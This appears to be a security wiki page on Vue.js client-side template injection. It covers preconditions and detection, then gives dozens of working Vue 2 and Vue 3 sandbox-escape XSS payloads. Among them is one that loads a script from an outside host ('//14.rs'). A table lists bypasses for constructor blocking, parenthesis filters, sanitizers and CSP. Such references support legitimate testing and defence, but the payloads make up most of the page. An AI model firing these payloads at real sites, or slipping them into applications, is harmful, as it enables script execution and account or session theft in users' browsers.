---
title: DOM XSS — Vue.js Framework Vectors (CSTI)
slug: framework-vectors-vue
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [technique/dom-xss, technique/framework-vectors-vue, technique/csti]
inbound: []
---

# DOM XSS — Vue.js Framework Vectors (CSTI)

## Pattern

Vue.js evaluates template expressions server-side-reflected or DOM-reflected into the template context. The `constructor.constructor` chain allows escaping the Vue sandbox to reach the global `Function` constructor and execute arbitrary JavaScript. In Vue 2, internal helpers (`_c`, `_v`, `_s`, `_b`) are exposed in the template scope and can be exploited similarly. In Vue 3, different globals (`_openBlock`, `_createBlock`, `_toDisplayString`, `_createVNode`, `_capitalize`, `_withCtx`) serve the same role.

## Preconditions

- Server-side or DOM-based reflection into a Vue template expression context (inside `{{ }}`, `v-html`, `v-if`, `v-bind`, `v-on`, `@event`, `:[dynamic-attr]`, `#slot`).
- Vue runtime must be loaded (not compile-time-only build).
- Vue 2 sandbox: if `constructor` access is blocked, fallback to `_c`/`_v`/`_s`/`_b` helpers.
- Vue 3: use `_openBlock`, `_createBlock`, `_Vue.h`, `$emit`, etc.

## Detection

- `js_analyzer` source: URL fragment / query param landing in `v-bind` / `v-html` / mustache.
- Static grep: `v-html=`, `v-bind=`, dynamic `:[attr]=`, `@[event]=` with user-controlled values.
- Look for Vue 2 (`vue.js`, `vue.min.js`, `__vue__` on DOM nodes) vs Vue 3 (`__VUE__`, `_Vue`).
- Vue template compiler error messages in console are a reliable oracle for injection context.

## Triggering

### Vue 2 — reflected

```html
<!-- Shortest: constructor chain (v2, 41 chars) -->
{{constructor.constructor('alert(1)')()}}

<!-- v-html with constructor chain (62 chars) -->
<div v-html="''.constructor.constructor('alert(1)')()">a</div>

<!-- v-html with _c helper (39 chars) -->
<x v-html=_c.constructor('alert(1)')()>

<!-- v-if with _c helper (37 chars) -->
<x v-if=_c.constructor('alert(1)')()>

<!-- Mustache with _c helper (32 chars) -->
{{_c.constructor('alert(1)')()}}

<!-- Mustache with _v helper -->
{{_v.constructor('alert(1)')()}}

<!-- Mustache with _s helper -->
{{_s.constructor('alert(1)')()}}

<!-- v-show with template literal -->
<p v-show="_c.constructor`alert(1)`()">

<!-- v-on:click -->
<x v-on:click='_b.constructor`alert(1)`()'>click</x>

<!-- v-bind:attr -->
<x v-bind:a='_b.constructor`alert(1)`()'>

<!-- Dynamic event: @[expr] -->
<x @[_b.constructor`alert(1)`()]>

<!-- Dynamic bind: :[expr] -->
<x :[_b.constructor`alert(1)`()]>

<!-- Shorthand @click -->
<x @click='_b.constructor`alert(1)`()'>click</x>

<!-- #slot dynamic -->
<x #[_c.constructor`alert(1)`()]>

<!-- v-bind:is to load script -->
<x v-bind:is="'script'" src="//14.rs" />

<!-- Unicode shorthand -->
<x is=script src=//⑭.₨>

<!-- $el DOM access -->
{{$el.ownerDocument.defaultView.alert(1)}}

<!-- $el innerHTML mutation -->
{{$el.innerHTML='<img src onerror=alert(1)>'}}

<!-- Event path pop -->
<img src @error=e=$event.path.pop().alert(1)>
<img src @error=e=$event.composedPath().pop().alert(1)>

<!-- this.alert -->
<img src @error=this.alert(1)>
<svg@load=this.alert(1)>

<!-- slot-scope escape (v2 only) -->
<p slot-scope="){}}])+this.constructor.constructor('alert(1)')()})};//">

<!-- Unicode event name bypass -->
<a @['c\lic\u{6b}']="_c.constructor('alert(1)')()">test</a>

<!-- mXSS via v-html (reflected sanitizer bypass) -->
<xyz<img/src onerror=alert(1)>>
```

### Vue 3 — reflected

```html
<!-- _openBlock -->
{{_openBlock.constructor('alert(1)')()}}

<!-- _createBlock -->
{{_createBlock.constructor('alert(1)')()}}

<!-- _toDisplayString -->
{{_toDisplayString.constructor('alert(1)')()}}

<!-- _createVNode -->
{{_createVNode.constructor('alert(1)')()}}

<!-- v-show with _createBlock template literal -->
<p v-show=_createBlock.constructor`alert(1)`()>

<!-- Dynamic event with _openBlock -->
<x @[_openBlock.constructor`alert(1)`()]>

<!-- Dynamic event with _capitalize -->
<x @[_capitalize.constructor`alert(1)`()]>

<!-- @click with _withCtx -->
<x @click=_withCtx.constructor`alert(1)`()>click</x>

<!-- $event.view access -->
<x @click=$event.view.alert(1)>click</x>

<!-- _Vue.h helper -->
{{_Vue.h.constructor`alert(1)`()}}

<!-- $emit constructor -->
{{$emit.constructor`alert(1)`()}}

<!-- <teleport> to script -->
<teleport to=script:nth-child(2)>alert&lpar;1&rpar;</teleport></div><script></script>

<!-- <component is=script> -->
<component is=script text=alert(1)>
```

## Bypasses

| Defense | Bypass |
|---|---|
| Block `constructor` | Use `_c`, `_v`, `_s`, `_b` (v2) or `_openBlock`, `_createBlock`, etc. (v3) |
| Block `'alert` string | Use template literals: `_c.constructor\`alert(1)\`()` |
| Block `(` `)` | Template literal tagged-function form |
| v2 sandbox restricts `__proto__` | Use `_b` / `_v` / `$el` paths |
| CSP blocks `new Function` | `<component is=script>`, `<teleport to=script>` for v3 |
| Sanitize `v-html` | `<xyz<img` mXSS or Unicode event name bypass |

## Seen-in-the-wild

- (none yet)

## References

- [../../sources/portswigger-xss-cheatsheet.md](../../sources/portswigger-xss-cheatsheet.md) — primary source; all payloads above are verbatim from the PortSwigger XSS Cheat Sheet (2026 ed., CSTI/VueJS section)
- [./client-side-template-injection.md](./client-side-template-injection.md) — parent CSTI pattern page
